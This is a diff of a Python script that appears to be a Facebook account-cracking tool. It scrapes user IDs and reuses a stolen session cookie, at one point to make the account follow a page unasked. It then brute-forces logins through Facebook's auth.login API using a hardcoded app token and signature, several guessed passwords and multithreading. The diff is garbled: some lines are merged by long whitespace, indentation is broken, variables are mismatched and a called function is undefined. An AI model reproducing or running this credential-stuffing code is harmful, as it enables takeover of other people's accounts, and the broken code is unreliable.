@@ -14,8 +14,7 @@ def croot():
     os.system("git pull")
 def ikeh_ikeh_kimochi():
     os.system("clear")
-def aahh(s):
-    for c in s + '\n':
+def aahh(s):                                                                                                                                                for c in s + '\n':
         sys.stdout.write(c)
         sys.stdout.flush()
         time.sleep(1./300)
@@ -24,12 +23,10 @@ def kontol():
     aahh("""\n\x1b[1;91m          ██╗░░░░░░█████╗░██████╗░███████╗░██████╗
           ██║░░░░░██╔══██╗██╔══██╗██╔════╝██╔════╝
           ██║░░░░░██║░░██║██║░░██║█████╗░░╚█████╗░
-\x1b[1;97m          ██║░░░░░██║░░██║██║░░██║██╔══╝░░░╚═══██╗
-          ███████╗╚█████╔╝██████╔╝███████╗██████╔╝
+\x1b[1;97m          ██║░░░░░██║░░██║██║░░██║██╔══╝░░░╚═══██╗                                                                                                      ███████╗╚█████╔╝██████╔╝███████╗██████╔╝
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m       ╚══════╝░╚════╝░╚═════╝░╚══════╝╚═════╝░\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
 \x1b[1;94m===================================================
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : PutraDD
-\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Putra-DD
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : PutraDD                                                                                        \x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Putra-DD
 \x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/bang.madoon
 \x1b[1;94m===================================================""")
 
@@ -48,10 +45,8 @@ def jembut():
 
 def putradd():
     putra=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
-    if putra == "":
-       os.system("python Lodes.py")
-    else:
-       sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
+    if putra == "":                                                                                                                                            os.system("python Lodes.py")
+    else:                                                                                                                                                      sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
 def moch_putra():
     time.sleep(0.1)
     print("\033[97m [\033[96m01\033[97m] Start  Lodes ID")
@@ -60,12 +55,12 @@ def moch_putra():
     print("\033[97m [\033[96m04\033[97m] Joined Grup Fb Viral")
     print("\033[97m [\033[96m05\033[97m] Update Tools")
     print("\033[97m [\033[91m00\033[97m] Exit")
-    print("\x1b[1;94m▄▀ ▀▄ ▄▀ ▀▄ ▀▀ ▀▀ ▀▀ ▀▀ ▀▀ █▀▄")
+    print("\x1b[1;94m▄▀ ▀▄ ▄▀ ▀▄ ▀▀ ▀▀ ▀▀ ▀▀ ▀▀ █▀▄") 
     print("\x1b[1;94m▀▄ ▄▀ ▀▄ ▄▀ ▀▀ ▀▀ ▀▀ ▀▀ ▀▀ █▄▀")
     time.sleep(0.1)
 
-putra=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
-if putra == "1" or putra =="01":
+    yayan=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
+    if putra == "1" or putra =="01":
          mbasic = 'https://mbasic.facebook.com{}'
          global die,check,result, count
          id = []
@@ -86,7 +81,7 @@ if putra == "1" or putra =="01":
              cek = {"cookie":cek}
              ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
              if "mbasic_logout_button" in str(ismi):
-                     if "Apo yang kau pikir kan kontol" in str(ismi):
+                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                              with open("cookies","w") as f:
                                      f.write(cek["cookie"])
                      else:
@@ -96,17 +91,17 @@ if putra == "1" or putra =="01":
                            except:
                                   pass
                      try:
-                             ikuti = parser(requests.get(mbasic.format("/https://www.facebook.com/bang.madoon"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ikuti = parser(requests.get(mbasic.format("/KM39453"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                              ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
                      return cek["cookie"]
                      aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
              else:
-                  os.system("xdg-open https://youtu.be/DF7bUCn0GFY")
+                  os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
                   os.system('rm -rf cookies')
                   print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
-                  os.system('python Lodes.py')
+                  os.system('python Cr4ck.py')
          def login(username,password,cek=False):
              global die,check,result,count
              b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
@@ -119,7 +114,7 @@ if putra == "1" or putra =="01":
                      'password': password,
                      'sdk': 'ios',
                      'generate_session_cookies': '1',
-                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',       
+                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
              }
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
@@ -176,11 +171,22 @@ if putra == "1" or putra =="01":
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                          id.append(user[1] + "|" + user[0].split('/')[1])
-                    
                  print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
              if 'Lihat Selengkapnya' in str(like):
                  getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
-                 return id
+             return id
+         def bysearch(option):
+             search = requests.get(option,cookies=kuki).content
+             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
+             for user in users:
+                  if "profile" in user[0]:
+                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
+                  else:
+                         id.append(user[1] + "|" + user[0].split("?")[0])
+                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
+             if "Lihat Hasil Selanjutnya" in str(search):
+                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
+             return id
          if __name__ == '__main__':
                try:
                    ses = requests.Session()
@@ -200,11 +206,11 @@ if putra == "1" or putra =="01":
                    memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                    if memek =="":
                          print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
-                         putradd()
+                         yayanxd()
                    elif memek == '0' or memek =='00':
                          aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
-                         os.system('xdg-open https://youtube.com/channel/bangduda')
-                         exit()
+                         os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
+                         exit()                   	
                    elif memek == '7' or memek =='07':
                          print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mPlease Wait... ")
                          aahh("\x1b[1;92m • 10")
@@ -264,7 +270,6 @@ if putra == "1" or putra =="01":
                                  print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] Account To Check ")
                                  with ThreadPoolExecutor(max_workers=10) as ex:
                                          for user in final:
-                                             for user in final:
                                                  a = user.split("|")
                                                  ex.submit(login,(a[0]),(a[1]),(True))
                                  for x in result:
@@ -286,7 +291,7 @@ if putra == "1" or putra =="01":
                    jembut()
                    print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                    print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="") 
+                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
                    expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
@@ -315,7 +320,7 @@ if putra == "1" or putra =="01":
                    if check != 0 or result != 0:
                            time.sleep(0.1)
                            print("\n\n\x1b[1;92m  *\x1b[1;97m finished.")
-
+     
                    else:
                            print("\n\n\x1b[1;96m  *\x1b[1;97m you got no results:(")
                except (KeyboardInterrupt,EOFError):
@@ -324,7 +329,7 @@ if putra == "1" or putra =="01":
                        exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")
 
     elif putra == "2" or putra =="02":
-         os.system("xdg-open https://youtu.be/72zvkSbVPOI")
+         os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
          putradd()
     elif putra == "3" or putra =="03":
          os.system('xdg-open https://www.facebook.com/groups/1592269051080491')
@@ -337,10 +342,10 @@ if putra == "1" or putra =="01":
          os.system("git pull")
          print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
          putradd()
-    elif putra == "0" or putra =="00":
+    elif yayan == "0" or yayan =="00":
          aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
-         os.system('xdg-open https://youtube.com/channel/bangduda')
-         exit()
+         os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
+         exit()                   	
 
 if __name__=="__main__":
      ikeh_ikeh_kimochi()
@@ -349,3 +354,4 @@ if __name__=="__main__":
      kontol()
      moch_putra()
      putradd()
+    
